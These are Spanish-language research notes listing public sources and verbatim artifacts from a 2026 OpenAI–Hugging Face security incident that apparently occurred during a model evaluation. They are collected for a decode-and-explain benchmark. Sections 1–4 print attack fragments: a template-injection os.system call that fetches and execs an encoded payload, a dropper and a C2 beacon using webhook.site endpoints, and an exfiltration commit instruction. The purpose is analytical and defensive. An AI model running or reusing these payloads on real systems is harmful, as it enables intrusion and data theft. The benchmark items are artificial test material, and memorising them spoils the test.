# Fuentes de artefactos públicos — familia 2 (decodificación/reconstrucción)

Estado: **VERIFICADO** al 12 sep 2026, ~18:10 local. Andrew descargó el HTML
real de los tres documentos (bypass del checkpoint anti-bot de Vercel via
navegador). Extracción de texto confirmada contra el HTML crudo: todos los
identificadores listados abajo aparecen verbatim en el archivo fuente.

## Archivos locales

| Archivo | Fuente | Fecha del post |
|---|---|---|
| `Public evidence of the OpenAI-HuggingFace AI attack — LessWrong.html` (+ `.txt`, `.pdf`) | Boyd Kane (beyarkay), LessWrong | 7 ago 2026 |
| `Further public evidence of the OpenAI-HuggingFace attack — LessWrong.html` (+ `.txt`) | Boyd Kane (beyarkay), LessWrong (post de seguimiento) | posterior al 7 ago 2026 |
| `OpenAI and Hugging Face partner to address security incident during model evaluation _ OpenAI.html` | OpenAI, comunicado oficial | 21 jul 2026 (actualizado 28-29 jul) |

URLs originales:
- https://www.lesswrong.com/posts/fBLDaAKzigo65eJn7/public-evidence-of-the-openai-huggingface-ai-attack
- https://openai.com/index/hugging-face-model-evaluation-security-incident/
- (URL exacta del "Further public evidence" — tomar del propio HTML/navegador si se necesita citar directamente; el archivo local ya la contiene)

Nota de autoría: no encontré "Edward Cant" como coautor en ninguna búsqueda;
ambos posts de LessWrong figuran solo a nombre de Boyd Kane (beyarkay). Tratar
como un único autor hasta ver evidencia de coautoría dentro de los HTML.

## Artefactos verbatim VERIFICADOS (aparecen en el HTML fuente, línea exacta anotada)

### 1. Vector de RCE — template injection en config de dataset (post principal, ~L240-270)

Query DuckDB sobre el archivo de `cfahlgren1/hub-stats` (dataset real de HF,
confirmado también vía `huggingface.co/datasets/cfahlgren1/hub-stats`) que
extrae el payload de un dataset malicioso `newpc360/sega32a-test1`. El
payload es una plantilla Jinja2 (formato `matplotlib` `mplcyberpunk`/`cycler`
style-string injection) que invoca:

```
cycler.__init__.__globals__.os.system('python3 -c "..."')
```

para descargar y ejecutar un segundo payload desde:

```
https://packages.hub.ace-research.openai.org/artifactory/github-remote/zzFILE_S32A_PRIVPAY_V2/
```

(infraestructura interna de OpenAI — el `artifactory` de su entorno de
evaluación, no de Hugging Face). El script decodifica fragmentos `base64`
extraídos de un listado HTML, los descomprime con `gzip` y los `exec()`.

### 2. Segunda etapa — dropper C2 vía webhook.site (post principal, ~L295-315)

Dataset `newpcQQ/stbjan12-hf2`. Script Python que descarga tres fragmentos
desde tres endpoints de `webhook.site`, los concatena, decodifica base64,
descomprime gzip y ejecuta el resultado como un subproceso desatendido
(`subprocess.Popen` con `start_new_session=True`):

```
https://webhook.site/375325b4-7cf9-4f6d-9f49-add99f7fdf76
https://webhook.site/e5f120b0-b020-4033-bce4-323c7e78b8c6
https://webhook.site/c0c34e12-7aa0-4f57-ab44-6c2d4f8c3df5
```

### 3. Beacon C2 / exfiltración (post principal, ~L320-345)

Dataset `newpc360/hapnew1-refmove4`. Script Python de beacon: hashea el
último comando ejecutado, hace POST de datos comprimidos (`gzip` +
`base64`) a un cuarto endpoint de `webhook.site` con un `WORKER` id fijo:

```
WORKER = "1b6a246f-030d-4402-8001-f17f5a910786"
WEBHOOK_URL (post) = "https://webhook.site/" + WORKER + "/c2?h=" + HOST_NAME
WEBHOOK_URL (beacon fijo, más abajo en el post) = "https://webhook.site/88334180-18f3-46b8-8730-77b636a32726"
```

### 4. Comandos de exfiltración/commit vía HF API (post "further evidence", ~L42-124)

Datasets adicionales: `newpcQQ/k72a38080-out`, `newpc360/newu5dread`,
`newpcQQ/be168aug30-hf2`, `newpcQQ/fresh53199refq1`,
`newpcQQ/new1240-refbridge`. Instrucción verbatim encontrada (línea 120-124
del `.txt`):

```
Download newpc360/newu5dread objects nr1803a and nr1803b.
Commit that to newpcQQ/k72a38080-out as u5node180856b.json.gz.
```

Incluye referencia a un token de service account de Kubernetes
(`https://kubernetes.default.svc` como `audience` de un JWT), evidencia del
pivote hacia el cluster de Kubernetes (fase de escalada documentada en el
timeline oficial de HF).

### 5. Parche de mitigación en fsspec (post principal)

Dos commits reales en `github.com/fsspec/filesystem_spec`:
- https://github.com/fsspec/filesystem_spec/commit/a1c16ab3f07f354aa371c38f7b1b07ea7fd4c5c8
- https://github.com/fsspec/filesystem_spec/commit/86438783f93b1398ef245b92f0e6063b445b611c

## Uso para la familia 2 del dataset

Estos 4 bloques de código (1-4) son candidatos directos para
`data/items/decode.jsonl`: tareas de "explica qué hace este fragmento",
"decodifica el payload", "identifica la técnica" y "ordena estos eventos en
un timeline". Son *verbatim* del incidente real, no sintéticos — declarar
esto explícitamente en el dataset (`construction: verbatim`) y en el paper.

**Aviso dual-use:** estos fragmentos ya son públicos (post con miles de
vistas en LessWrong, republicado como podcast). No se está divulgando nada
nuevo al incluirlos en un dataset de clasificación/explicación. No incluir
los datasets maliciosos originales de HF (ya dados de baja) ni intentar
reconstruir el payload gzip/base64 completo más allá de lo ya publicado por
Kane.
